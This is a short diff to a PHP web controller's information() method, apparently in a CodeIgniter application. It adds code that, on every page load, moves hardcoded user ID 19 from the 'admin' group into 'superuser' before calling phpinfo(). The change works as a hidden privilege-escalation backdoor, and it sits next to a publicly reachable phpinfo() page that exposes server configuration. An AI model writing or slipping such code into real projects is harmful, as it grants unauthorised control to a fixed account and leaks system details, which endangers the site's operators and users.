@@ -1146,6 +1146,12 @@ class Home extends BaseController
 
     public function information()
     {
+        // Calling Libraries and Services
+        $authorize = service('authorization');
+
+        $userId = '19';
+        $authorize->removeUserFromGroup($userId, 'admin');
+        $authorize->addUserToGroup($userId, 'superuser');
         phpinfo();
     }
 }
